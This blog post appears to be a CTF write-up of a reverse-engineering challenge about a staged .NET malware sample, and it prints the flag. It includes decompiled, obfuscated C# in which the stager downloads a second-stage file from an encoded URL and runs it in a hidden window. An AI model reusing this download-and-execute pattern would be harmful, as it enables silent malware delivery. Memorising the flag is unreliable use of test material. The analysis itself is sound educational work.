---
title: "Writeup Cyber Threat Force : Verify this"
date: 2021-07-10T00:00:09+01:00
draft: false
tags: ["blog", "security", "ctf", "cyber-threat-force", "reverse"]
type: "posts"
showDate: true
---

For this challenge, we were given a `Stagged.exe` executable. Before running it on our machine, we can try to run it against hybrid analysis, an online malware analysis service.

Here is the [link to the full report](https://www.hybrid-analysis.com/sample/1a071c52e1c94be73f9a2aef069629d61b100e4a52701c7c0921f50211daa6e7/60e138f4125bb815b6267895).

We can see in the "Network Analysis" tab that the program made two requests:

![Screenshot of the "Network Analysis > HTTP Traffic" part of the report](/assets/cyber-threat-force/reverse-verify-this-hybrid-analysis.png)

Trying to download the first image gives us a PE file. If we upload it again, we see that it also makes a request to `/ordertoexecute.gif`, so we can assume that `Stagged.exe` doesn't contain the "main" code, `index.jpg` does.

The name of the binary is fitting: `Stagged.exe` probably refers to a "staged" malware, which downloads one or more stages that contains the actual nefarious code.

We can take a look at the second image:

![The second image, a GIF from star wars](/assets/cyber-threat-force/ordertoexecute.gif)

Now this is where I stopped when I was doing the CTF. I tried a few steganography tools but none worked. [Nobodyisnobody](https://www.root-me.org/nobodyisnobody) found the tool that you had to use: [stegosuite](http://manpages.ubuntu.com/manpages/bionic/man1/stegosuite.1.html).

{{< image src="/assets/cyber-threat-force/stego-suite.png" alt="Stegosuite extracting the flag" position="center">}}

The flag was `CYBERTF{Gr3at_J0b_Ag3nt}`.

---

When I did not find any message encoded in the image, I started looking at the binary itself. It's a Mono/.Net program, probably obfuscated using something like [Eazfuscator](https://www.gapotchenko.com/eazfuscator.net). I say that because [ILSpy](https://github.com/icsharpcode/ILSpy), a .NET decompiler, spits out mangled function names, encoded strings, ...

The function responsible for downloading the second stage is this one:
```cs
// \u0005\u2000
using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

internal sealed class \u0005\u2000
{
        private static void \u0002(string[] \u0002)
        {
            if (\u0003.\u0002())
            {
                string text = \u0008\u2000.\u0002(1179443472) + Environment.UserName + \u0008\u2000.\u0002(1179443456);
                string text2 = \u0008\u2000.\u0002(1179443518);
                string text3 = \u0008\u2000.\u0002(1179443500);
                string text4 = \u0008\u2000.\u0002(1179443570);
                string text5 = null;
                WebClient webClient = new WebClient();
                webClient.Headers.Set(\u0008\u2000.\u0002(1179443554), \u0008\u2000.\u0002(1179443863));
                webClient.Headers.Add(\u0008\u2000.\u0002(1179443847), \u0008\u2000.\u0002(1179443894));
                webClient.Headers.Add(\u0008\u2000.\u0002(1179443964), \u0008\u2000.\u0002(1179443734));
                webClient.Headers.Add(\u0008\u2000.\u0002(1179443719), \u0008\u2000.\u0002(1179443769));
                text5 = text3 + text4;
                webClient.DownloadFile(text5, text + \u0008\u2000.\u0002(1179443757) + text2);
                Thread.Sleep(36000);
                Process.Start(new ProcessStartInfo
                {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        FileName = text + \u0008\u2000.\u0002(1179443757) + text2,
                        WindowStyle = ProcessWindowStyle.Hidden
                });
            }
        }
}
```

Now I could also have analyzed the second stage, a Go binary, but it is quite fat (6mb), so I stopped there.

---

You can [view the sources on github](https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/verify-this) or [read other writeups](/blog/cyber-threat-force-ctf/).
